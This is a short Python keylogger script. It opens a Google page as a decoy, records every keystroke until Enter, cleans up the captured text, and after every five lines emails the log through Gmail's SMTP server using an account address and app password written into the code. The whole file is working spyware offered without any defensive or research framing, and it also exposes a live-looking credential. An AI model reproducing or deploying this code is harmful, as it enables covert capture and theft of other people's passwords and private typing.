# Keyboard module in Python
import keyboard
import re
import webbrowser
import smtplib
import ssl

webbrowser.open("www.google.com")
compteur = 0

last_str_rk = ""

def envoi():
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
        server.login("leserpentpython327@gmail.com","cnwrgmlvwsnlcmqz")
        server.sendmail("leserpentpython327@gmail.com", "leserpentpython327@gmail.com", last_str_rk) 

while True:
    rk = keyboard.record(until ='enter')

    str_rk = str(rk)

    sub = re.sub("KeyboardEvent","",str_rk)
    sub2 = re.sub("[()]","",sub)

    new_str_rk = ""

    for i in sub2.split(','):
        if 'up' not in i:
            new_str_rk = new_str_rk + i

    sub3 = re.sub(" down","",new_str_rk)
    sub4 = re.sub("esc","",sub3)
    sub5 = re.sub(" ","",sub4)
    sub6 = re.sub("space"," ",sub5)
    sub7 = re.sub("enter","",sub6)
    last_str_rk += sub7
    last_str_rk.encode('utf-8')

    compteur += 1

    if compteur == 5:
        compteur = 0
        envoi()
        last_str_rk = ""  